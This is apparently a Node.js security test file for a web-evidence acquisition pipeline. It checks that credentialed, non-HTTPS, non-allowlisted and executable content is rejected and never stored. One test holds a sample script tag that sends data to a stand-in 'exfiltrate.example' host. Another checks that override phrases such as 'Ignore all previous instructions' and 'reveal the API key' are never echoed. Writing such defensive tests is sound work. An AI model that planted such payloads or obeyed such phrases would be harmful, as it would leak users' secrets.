#!/usr/bin/env node
/*
 * tests/web-evidence.security.mjs
 * ------------------------------------------------------------------------
 * Feature 012 Scope 10 — TP-10-03 security / adversarial functional tests.
 *
 * CATEGORY: functional over an INJECTED boundary (NOT live-system). Proves that
 * hostile, credentialed, non-transport-compliant, executable, unbounded, stale,
 * later-than-cutoff, and metadata-incomplete content is REJECTED and NEVER
 * echoed to logs, artifacts, or the frozen bundle; and a STATIC import / call
 * graph assertion proves scripts/web-evidence-acquire.mjs imports NO author or
 * publication module and owns ZERO fetch / provider-key / repository-write /
 * current-pointer / owner-model authority.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  ACQUISITION_ERROR_CODES,
  SAFE_REJECTION_DETAILS
} from '../scripts/web-evidence-acquire.mjs';
import {
  resolveResearchAgendaPolicy,
  validateResearchAgendaAcquisitionUsage
} from '../scripts/research-agenda-generation.mjs';
import {
  loadConfig,
  resolveFixturePolicies,
  loadFixture,
  runFixtureAcquisition,
  evaluateFixture,
  scanModuleAuthority
} from '../scripts/validate-web-evidence.mjs';

const config = loadConfig();
const policies = resolveFixturePolicies(config);
const toolBrief = policies['tool-brief'];

/* build a minimal one-candidate scenario over the injected boundary. For URL-
   policy rejections the content response is never reached; for content-level
   rejections it is retrieved and then discarded. */
function singleCandidate({ url, canonicalKey, response, robotsBody = 'User-agent: *\nAllow: /markets\n' }) {
  const runId = 'run/2026-07-26/security-case';
  const retrieve = { 'https://reuters.example/robots.txt': { status: 200, contentType: 'text/plain', durationMs: 30, body: robotsBody } };
  if (response) retrieve[canonicalKey || url] = response;
  return {
    scenario: 'security-inline',
    lane: 'tool-brief',
    toolId: 'market-brief',
    runId,
    cutoffAt: '2026-07-26T15:00:00.000Z',
    acquisitionStartedAt: '2026-07-26T15:00:05.000Z',
    frozenAt: '2026-07-26T15:00:20.000Z',
    queryPlanInput: {
      templates: [{
        templateId: 'security',
        termsTemplate: '{{ticker}} report',
        purpose: 'material-claim-corroboration',
        allowedHosts: [{ host: 'reuters.example', pathPrefix: '/markets' }],
        requiredSourceClasses: ['wire'],
        freshnessWindowDays: 7,
        maxResults: 4
      }],
      facts: { ticker: 'ACME' }
    },
    claimSpecs: [],
    ownerEvidence: {},
    boundary: { search: { [runId + ':q0']: [{ candidateId: 'cand-sec', url }] }, retrieve }
  };
}

function contentResponse(overrides = {}) {
  return {
    status: 200,
    finalUrl: 'https://reuters.example/markets/acme-sec',
    contentType: 'text/html',
    durationMs: 100,
    body: '<p>An ordinary market note.</p>',
    meta: {
      title: 'Note',
      publisher: 'Reuters',
      publishedAt: '2026-07-26T13:00:00.000Z',
      sourceClass: 'wire',
      supportsClaims: [],
      excerpts: ['An ordinary market note.']
    },
    ...overrides
  };
}

async function acquireInline(scenario) {
  const { acquireResult } = await runFixtureAcquisition(scenario, toolBrief);
  return acquireResult;
}

test('a credentialed candidate url is rejected (credentialed-url) and the credential is never echoed', async () => {
  const result = await acquireInline(singleCandidate({ url: 'https://analyst:hunter2@reuters.example/markets/acme-sec' }));
  assert.equal(result.ok, true, 'the run still freezes a (zero-source) bundle');
  const rejection = result.value.rejected.find((r) => r.candidateId === 'cand-sec');
  assert.equal(rejection.reasonCode, 'E012-WEB-UNSAFE');
  assert.equal(rejection.safeReasonDetail, 'credentialed-url');
  assert.equal(JSON.stringify(result.value).includes('hunter2'), false, 'the credential must never appear in the bundle');
});

test('a non-HTTPS candidate url is rejected (scheme-not-https)', async () => {
  const result = await acquireInline(singleCandidate({ url: 'http://reuters.example/markets/acme-sec' }));
  const rejection = result.value.rejected.find((r) => r.candidateId === 'cand-sec');
  assert.equal(rejection.reasonCode, 'E012-WEB-POLICY');
  assert.equal(rejection.safeReasonDetail, 'scheme-not-https');
});

test('an IP-literal host is rejected (ip-literal-host)', async () => {
  const result = await acquireInline(singleCandidate({ url: 'https://203.0.113.7/markets/acme-sec' }));
  const rejection = result.value.rejected.find((r) => r.candidateId === 'cand-sec');
  assert.equal(rejection.reasonCode, 'E012-WEB-UNSAFE');
  assert.equal(rejection.safeReasonDetail, 'ip-literal-host');
});

test('a non-allowlisted host is rejected (host-not-allowlisted)', async () => {
  const result = await acquireInline(singleCandidate({ url: 'https://evil.example/markets/acme-sec' }));
  const rejection = result.value.rejected.find((r) => r.candidateId === 'cand-sec');
  assert.equal(rejection.reasonCode, 'E012-WEB-POLICY');
  assert.equal(rejection.safeReasonDetail, 'host-not-allowlisted');
});

test('executable markup in the body is rejected (executable-markup) and never stored', async () => {
  const url = 'https://reuters.example/markets/acme-sec';
  const response = contentResponse({
    finalUrl: url,
    body: "<p>ok</p><script>fetch('https://exfiltrate.example?k=leak')</script>"
  });
  const result = await acquireInline(singleCandidate({ url, canonicalKey: url, response }));
  const rejection = result.value.rejected.find((r) => r.candidateId === 'cand-sec');
  assert.equal(rejection.reasonCode, 'E012-WEB-UNSAFE');
  assert.equal(rejection.safeReasonDetail, 'executable-markup');
  const serialized = JSON.stringify(result.value);
  assert.equal(serialized.includes('<script'), false, 'script markup is never stored');
  assert.equal(serialized.includes('exfiltrate.example'), false, 'the hostile url is never stored');
});

test('a non-text executable media type is rejected (executable-media)', async () => {
  const url = 'https://reuters.example/markets/acme-sec';
  const response = contentResponse({ finalUrl: url, contentType: 'application/javascript' });
  const result = await acquireInline(singleCandidate({ url, canonicalKey: url, response }));
  const rejection = result.value.rejected.find((r) => r.candidateId === 'cand-sec');
  assert.equal(rejection.reasonCode, 'E012-WEB-UNSAFE');
  assert.equal(rejection.safeReasonDetail, 'executable-media');
});

test('the committed injection-hostile fixture rejects and never echoes the hostile string', async () => {
  const fixture = loadFixture('injection-hostile');
  await evaluateFixture(fixture, toolBrief);
  const result = await acquireInline(fixture);
  assert.equal(result.value.coverage.retainedSourceCount, 0);
  assert.equal(JSON.stringify(result.value).includes('Ignore all previous instructions'), false);
  assert.equal(JSON.stringify(result.value).includes('reveal the API key'), false);
});

test('every rejection carries only closed reason codes and safe detail tokens (no remote content)', async () => {
  const scenarios = ['robots-disallow', 'redirects', 'metadata-gaps', 'later-than-cutoff', 'injection-hostile'];
  for (const name of scenarios) {
    const result = await acquireInline(loadFixture(name));
    for (const rejection of result.value.rejected) {
      assert.equal(ACQUISITION_ERROR_CODES.includes(rejection.reasonCode), true, `${name} reasonCode is closed`);
      assert.equal(SAFE_REJECTION_DETAILS.includes(rejection.safeReasonDetail), true, `${name} safeReasonDetail is closed`);
      assert.deepEqual(Object.keys(rejection).sort(), ['candidateId', 'reasonCode', 'safeHost', 'safeReasonDetail'], `${name} rejection carries only allowlisted fields`);
    }
  }
});

test('STATIC authority proof: acquisition module imports ONLY node:crypto and owns zero forbidden capability', () => {
  const authority = scanModuleAuthority();
  assert.deepEqual(authority.imports, ['node:crypto'], 'the ONLY import is a pure hashing primitive');
  assert.equal(authority.forbiddenCapabilityCount, 0, 'zero fetch/provider-key/repo-write/current-pointer/owner-model capability');
  assert.equal(authority.importsAuthorModule, false, 'imports NO author or publication module');
});

test('Regression: agenda acquisition rejects query URL byte time and concurrency limits at capacity plus one', () => {
  const policyResult = resolveResearchAgendaPolicy(config);
  assert.equal(policyResult.ok, true);
  const policy = policyResult.value;
  const atCapacity = {
    queryCount: policy.maxQueries,
    candidateUrlCount: policy.maxCandidateUrls,
    retainedOriginCount: policy.maxRetainedOrigins,
    retainedExcerptCount: policy.maxRetainedExcerpts,
    maxExcerptBytes: policy.maxExcerptBytes,
    maxResponseBytesPerUrl: policy.maxResponseBytesPerUrl,
    bundleBytes: policy.maxBundleBytes,
    maxRequestMs: policy.perRequestTimeoutMs,
    totalAcquisitionMs: policy.totalAcquisitionMs,
    peakConcurrentFetches: policy.maxConcurrentFetches
  };
  assert.equal(validateResearchAgendaAcquisitionUsage(atCapacity, policy).ok, true);
  for (const field of Object.keys(atCapacity)) {
    const over = validateResearchAgendaAcquisitionUsage({ ...atCapacity, [field]: atCapacity[field] + 1 }, policy);
    assert.equal(over.ok, false, `${field} plus one must refuse`);
    assert.equal(over.error.code, 'E012-WEB-BUDGET');
    assert.equal(over.error.field, field);
  }
});
